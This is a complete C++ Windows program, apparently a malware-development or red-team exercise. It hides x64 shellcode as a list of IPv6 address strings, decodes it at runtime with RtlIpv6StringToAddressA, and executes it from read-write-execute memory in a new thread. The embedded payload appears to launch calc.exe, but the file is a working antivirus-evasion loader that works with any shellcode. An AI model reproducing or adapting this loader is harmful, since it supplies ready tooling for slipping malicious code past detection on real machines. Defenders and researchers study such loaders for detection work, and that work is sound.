#include <Windows.h>
#include <cstdio>
#pragma comment(lib, "Ntdll.lib")

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

const char* Ipv6Array[19] = {
        "FC48:83E4:F0E8:C000:0000:4151:4150:5251", "5648:31D2:6548:8B52:6048:8B52:1848:8B52", "2048:8B72:5048:0FB7:4A4A:4D31:C948:31C0",
        "AC3C:617C:022C:2041:C1C9:0D41:01C1:E2ED", "5241:5148:8B52:208B:423C:4801:D08B:8088", "0000:0048:85C0:7467:4801:D050:8B48:1844",
        "8B40:2049:01D0:E356:48FF:C941:8B34:8848", "01D6:4D31:C948:31C0:AC41:C1C9:0D41:01C1", "38E0:75F1:4C03:4C24:0845:39D1:75D8:5844",
        "8B40:2449:01D0:6641:8B0C:4844:8B40:1C49", "01D0:418B:0488:4801:D041:5841:585E:595A", "4158:4159:415A:4883:EC20:4152:FFE0:5841",
        "595A:488B:12E9:57FF:FFFF:5D48:BA01:0000", "0000:0000:0048:8D8D:0101:0000:41BA:318B", "6F87:FFD5:BBF0:B5A2:5641:BAA6:95BD:9DFF",
        "D548:83C4:283C:067C:0A80:FBE0:7505:BB47", "1372:6F6A:0059:4189:DAFF:D543:3A5C:7769", "6E64:6F77:735C:7379:7374:656D:3332:5C63",
        "616C:632E:6578:6500:9090:9090:9090:9090"
};

typedef NTSTATUS(NTAPI* fnRtlIpv6StringToAddressA)(
    PCSTR           S,
    PCSTR* Terminator,
    PVOID           Addr
    );

BOOL Ipv6Deobfuscation(IN const CHAR* Ipv6Array[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {


    PBYTE pBuffer = NULL;
    PBYTE TmpBuffer = NULL;

    SIZE_T sBuffSize = NULL;

    PCSTR Terminator = NULL;
    NTSTATUS STATUS = NULL;

    fnRtlIpv6StringToAddressA pRtlIpv6StringToAddressA = (fnRtlIpv6StringToAddressA)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "RtlIpv6StringToAddressA");
    if (!pRtlIpv6StringToAddressA) {
        printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    sBuffSize = NmbrOfElements * 16;

    pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize);

    if (pBuffer == NULL) {
        printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    TmpBuffer = pBuffer;

    for (size_t i = 0; i < NmbrOfElements; ++i) {

        STATUS = pRtlIpv6StringToAddressA(Ipv6Array[i], &Terminator, TmpBuffer);

        if (!NT_SUCCESS(STATUS)) {
            printf("[!] RtlIpv4StringToAddressA Failed At [%s] With Error 0x%0.8X", Ipv6Array[i], STATUS);
            return FALSE;
        }

        TmpBuffer = (PBYTE)(TmpBuffer + 16);

    }

    *ppDAddress = pBuffer;
    *pDSize = sBuffSize;

    return TRUE;

}

int main() {



    // Local buffer for execute 
    LPVOID exec_mem;
    // Pointer on buffer where stored a shellcode
    PBYTE ppDAddress = NULL;
    // Shell code size 
    SIZE_T pDSize = 0;
    // local thread for execute 
    HANDLE hThread = NULL;

    // Deobfuscate shellcode
    Ipv6Deobfuscation(Ipv6Array, 19, &ppDAddress, &pDSize);

    exec_mem = VirtualAlloc(0, pDSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    RtlMoveMemory(exec_mem, ppDAddress, pDSize);

    hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
    WaitForSingleObject(hThread, -1);

    if (ppDAddress != NULL)
    {
        HeapFree(GetProcessHeap(), 0, ppDAddress);
    }


    return 0;
}